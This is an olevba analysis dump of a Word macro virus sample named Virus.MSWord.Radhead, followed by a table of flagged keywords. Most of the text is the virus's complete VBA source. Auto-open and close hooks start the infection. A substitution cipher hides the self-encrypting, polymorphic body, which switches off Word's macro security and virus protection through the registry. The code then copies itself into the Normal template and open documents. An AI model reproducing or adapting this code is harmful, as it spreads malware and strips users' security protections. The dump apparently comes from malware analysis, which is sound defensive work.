olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Radhead
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Radhead - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AUTOOPEN(): RADHEAD.CRYPT_CALL: End Sub
Private Sub AUTOCLOSE(): RADHEAD.CRYPT_CALL: End Sub
Private Sub AUTONEW(): RADHEAD.CRYPT_CALL: End Sub
Private Sub DOCUMENT_CLOSE(): RADHEAD.CRYPT_CALL: End Sub
Private Sub DOCUMENT_OPEN(): RADHEAD.CRYPT_CALL: End Sub
Private Sub DOCUMENT_NEW(): RADHEAD.CRYPT_CALL: End Sub
-------------------------------------------------------------------------------
VBA MACRO RADHEAD.bas 
in file: ./Virus.MSWord.Radhead - OLE stream: 'Macros/VBA/RADHEAD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub GoThru()
'GF TKKGK KTLXDT FTBZ
'LNLZTD.HKOCQZTHKGYOSTLZKOFU("", "IATN_EXKKTFZ_XLTK\LGYZVQKT\DOEKGLGYZ\GYYOET\10.0\VGKR\LTEXKOZN", "STCTS") = 1&
'LNLZTD.HKOCQZTHKGYOSTLZKOFU("", "IATN_EXKKTFZ_XLTK\LGYZVQKT\DOEKGLGYZ\GYYOET\10.0\VGKR\LTEXKOZN", "QEETLLCWGD") = 1&
'LNLZTD.HKOCQZTHKGYOSTLZKOFU("", "IATN_EXKKTFZ_XLTK\LGYZVQKT\DOEKGLGYZ\GYYOET\9.0\VGKR\LTEXKOZN", "STCTS") = 1&
'VOZI QHHSOEQZOGF
'.LEKTTFXHRQZOFU = 0
'.ROLHSQNQSTKZL = VRQSTKZLFGFT
'.ROLHSQNLZQZXLWQK = 0
'TFR VOZI
'
'VOZI GHZOGFL
'.EGFYOKDEGFCTKLOGFL = 0
'.COKXLHKGZTEZOGF = 0
'.LQCTFGKDQSHKGDHZ = 0
'TFR VOZI
'
'QKQRITQR = "KQRITQR"
'YST = TFCOKGF("VOFROK") & "\" & QKQRITQR & ".LNL"
'
'
'YGK O = 1 ZG QEZOCTRGEXDTFZ.CWHKGPTEZ.CWEGDHGFTFZL.EGXFZ
'OY QEZOCTRGEXDTFZ.CWHKGPTEZ.CWEGDHGFTFZL(O).FQDT = QKQRITQR ZITF QFLZ = 1
'FTBZ
'
'YGK O = 1 ZG FGKDQSZTDHSQZT.CWHKGPTEZ.CWEGDHGFTFZL.EGXFZ
'OY FGKDQSZTDHSQZT.CWHKGPTEZ.CWEGDHGFTFZL(O).FQDT = QKQRITQR ZITF FFLZ = 1
'FTBZ
'
'OY QFLZ <> 1 ZITF QEZOCTRGEXDTFZ.CWHKGPTEZ.CWEGDHGFTFZL.ODHGKZ YST
'OY FFLZ <> 1 ZITF FGKDQSZTDHSQZT.CWHKGPTEZ.CWEGDHGFTFZL.ODHGKZ YST
'
'
'FGKDQSZTDHSQZT.GHTFQLRGEXDTFZ
'QEZOCTRGEXDTFZ.LQCTQL QHHSOEQZOGF.LZQKZXHHQZI & QKQRITQR & ".RGZ"
'QRROFL(QKQRITQR & ".RGZ").OFLZQSSTR = 1
'FGKDQSZTDHSQZT.LQCTR = 1
'QEZOCTRGEXDTFZ.ESGLT
'OY QEZOCTRGEXDTFZ.LQCTR = 0 ZITF QEZOCTRGEXDTFZ.LQCTQL YOSTFQDT:=QEZOCTRGEXDTFZ.YXSSFQDT
End Sub

Sub CRYPT_CALL()
With ThisDocument.VBProject.VBCOMPONENTS("RADHEAD").CodeModule
SLYM = 1
ARADHEAD = "RADHEAD"
FLE = Environ("WINDIR") & "\" & ARADHEAD & ".SYS"
VBE.ACTIVEVBPROJECT.VBCOMPONENTS("RADHEAD").EXPORT FLE
For L = 1 To SLYM
For I = 2 To 39
.ReplaceLine I, Right(DeCrypt(.Lines(I, 1)), Len(.Lines(I, 1)) - 1)
Next
Next
GoThru
Randomize Timer
SLYM = Int(Rnd * 10) + 1
.ReplaceLine 44, "SLYM = " & SLYM
For L = 1 To SLYM
For I = 2 To 39
.ReplaceLine I, "'" & EnCrypt(.Lines(I, 1))
Next
Next
End With
Code = "HKOCQZT LXW QXZGGHTF():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW QXZGESGLT():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW QXZGFTV():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW RGEXDTFZ_ESGLT():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW RGEXDTFZ_GHTF():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW RGEXDTFZ_FTV():KQRITQR.EKNHZ_EQSS:TFR LXW"
With ActiveDocument.VBProject.VBCOMPONENTS(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString DeCrypt(Code)
End With
With NormalTemplate.VBProject.VBCOMPONENTS(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString DeCrypt(Code)
End With
End Sub

Private Function EnCrypt(a)
For I = 1 To Len(a)
N = UCase(Mid(a, I, 1))
P = N
If N = "A" Then P = "Q"
If N = "B" Then P = "W"
If N = "C" Then P = "E"
If N = "D" Then P = "R"
If N = "E" Then P = "T"
If N = "F" Then P = "Y"
If N = "G" Then P = "U"
If N = "H" Then P = "I"
If N = "I" Then P = "O"
If N = "J" Then P = "P"
If N = "K" Then P = "A"
If N = "L" Then P = "S"
If N = "M" Then P = "D"
If N = "N" Then P = "F"
If N = "O" Then P = "G"
If N = "P" Then P = "H"
If N = "Q" Then P = "J"
If N = "R" Then P = "K"
If N = "S" Then P = "L"
If N = "T" Then P = "Z"
If N = "U" Then P = "X"
If N = "V" Then P = "C"
If N = "W" Then P = "V"
If N = "X" Then P = "B"
If N = "Y" Then P = "N"
If N = "Z" Then P = "M"
EnCrypt = EnCrypt & P
Next
End Function
Private Function DeCrypt(a)
For I = 1 To Len(a)
N = UCase(Mid(a, I, 1))
P = N
If N = "Q" Then P = "A"
If N = "W" Then P = "B"
If N = "E" Then P = "C"
If N = "R" Then P = "D"
If N = "T" Then P = "E"
If N = "Y" Then P = "F"
If N = "U" Then P = "G"
If N = "I" Then P = "H"
If N = "O" Then P = "I"
If N = "P" Then P = "J"
If N = "A" Then P = "K"
If N = "S" Then P = "L"
If N = "D" Then P = "M"
If N = "F" Then P = "N"
If N = "G" Then P = "O"
If N = "H" Then P = "P"
If N = "J" Then P = "Q"
If N = "K" Then P = "R"
If N = "L" Then P = "S"
If N = "Z" Then P = "T"
If N = "X" Then P = "U"
If N = "C" Then P = "V"
If N = "V" Then P = "W"
If N = "B" Then P = "X"
If N = "N" Then P = "Y"
If N = "M" Then P = "Z"
DeCrypt = DeCrypt & P
Next
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |AUTONEW             |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

